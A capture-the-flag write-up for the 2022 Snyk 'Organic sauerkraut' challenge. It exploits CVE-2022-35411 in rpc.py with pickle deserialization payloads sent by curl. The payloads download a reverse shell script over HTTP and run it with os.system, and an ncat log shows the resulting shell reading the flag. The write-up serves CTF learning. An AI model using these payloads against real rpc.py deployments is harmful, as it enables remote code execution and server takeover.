# 2022 Snyk - Organic sauerkraut

The challenge had openapi-docs behind URL:
```sh
$ curl -sS "http://organic-sauerkraut.c.ctf-snyk.io/get-openapi-docs" | jq '.paths | keys[]'
"/saybye"
"/sayhi"
$ curl -sS "http://organic-sauerkraut.c.ctf-snyk.io/get-openapi-docs" | jq '.paths."/sayhi".post.parameters'
[
  {
    "name": "content-type",
    "in": "header",
    "description": "At least one of serializer and content-type must be used so that the server can know which serializer is used to parse the data.",
    "required": true,
    "schema": {
      "type": "string",
      "enum": [
        "application/json",
        "application/x-pickle",
        "application/x-msgpack",
        "application/x-cbor"
      ]
    }
  },
  {
    "name": "serializer",
    "in": "header",
    "description": "At least one of serializer and content-type must be used so that the server can know which serializer is used to parse the data.",
    "required": true,
    "schema": {
      "type": "string",
      "enum": [
        "json",
        "pickle",
        "msgpack",
        "cbor"
      ]
    }
  }
]
```

and a requirements.txt file:
```
rpc.py==0.6.0
uvicorn==0.18.2
pydantic==1.9.1
```

Just by observing dependencies, rpc.py looks most promising since it contains an RCE vulnerability CVE-2022-35411, more details on https://security.snyk.io/vuln/SNYK-PYTHON-RPCPY-2946719.

For the majority of the CTF, this challenge was bricked or it just did not work. There is an exploit available and for any payload sent we got 500 Internal Server Error with no ability to get a callback.

At the end of the CTF we have managed to provoke a callback towards our service by using plain python `urllib`. The winning combination that worked for us was:
- downloading a reverse shell python script from our server via `urllib`:
```sh
$ cat sauerkraut-pickle.py
def generate_payload(cmd):
    class PickleRce(object):
        def __reduce__(self):
            import urllib
            return urllib.request.urlretrieve, (cmd, "/tmp/a.py")
    payload = pickle.dumps(PickleRce())
    return payload

with open("/tmp/payload", "wb") as fp:
    fp.write(generate_payload("http://127.0.0.1:8000/a.py"))
$ python3 sauerkraut-pickle.py
$ curl -X POST "http://organic-sauerkraut.c.ctf-snyk.io/sayhi" -H "Content-Type: application/json" -H  "serializer: pickle" --data-binary @"/tmp/payload" -vv
```

- running the reverse shell python script on the server via `os.system`:
```sh
$ cat sauerkraut-pickle.py
def generate_payload(cmd):
    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)
    payload = pickle.dumps(PickleRce())
    return payload

with open("/tmp/payload", "wb") as fp:
    fp.write(generate_payload("python3 /tmp/a.py"))
$ python3 sauerkraut-pickle.py
$ curl -X POST "http://organic-sauerkraut.c.ctf-snyk.io/sayhi" -H "Content-Type: application/json" -H  "serializer: pickle" --data-binary @"/tmp/payload" -vv
```

After obtaining shell, we got the flag:
```sh
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 35.237.......
Ncat: Connection from 35.237......:2240.
$ ls
ls
requirements.txt  server.py
$ ls /
ls /
app  boot  etc   home  lib64  mnt  proc  run   srv  tmp  var
bin  dev   flag  lib   media  opt  root  sbin  sys  usr
$ cat /flag
cat /flag
SNYK{60dc6362adec85eeb1f2615dff19cf432a7b897d286cf19b94ea4ee36b8ea9d8}
```
